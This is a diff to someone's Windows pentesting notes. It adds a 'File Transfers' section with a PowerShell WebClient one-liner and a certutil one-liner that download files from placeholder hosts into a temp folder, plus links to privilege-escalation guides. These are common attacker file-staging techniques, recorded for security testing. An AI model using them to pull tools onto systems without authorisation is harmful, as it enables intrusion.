@@ -2,6 +2,20 @@
 
 ## Windows Registry
 
+## File Transfers
+
+### powershell
+
+```text
+(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+```
+
+### certutil
+
+```bash
+certutil.exe -urlcache -split -f https://myserver/filename outputfilename
+```
+
 ## Powershell
 
 Powershell was Windows' answer to improving the scripting solution within Windows.  It's incredibly powerful for both Sysadmins as well as attackers.  Here I will include a number of snippets I've found useful for attacking devices with.
@@ -129,4 +143,9 @@ Get-Content -path C:\Users\Booj\ads -stream <streamname>
 In Windows prior to Vista, there's unfortunately no easy way of viewing these streams in default Windows without a GUI access.  In an engagement this may not be entirely practical.
 
 The best version, working on XP, I found to be [LADS](https://www.aldeid.com/wiki/LADS), but a number of the links online appear to be dead.  The [Web Archive](http://web.archive.org/web/20150602054446/http://www.heysoft.de/download/lads.zip) version is still up so acquiring a copy is still possible.
+
+## References
+
+[Abatchy - Powershell Download File One-Liners](https://www.abatchy.com/2017/03/powershell-download-file-one-liners)  
+[Sploitspren - Windows Privilege Escalation Guide](https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
 
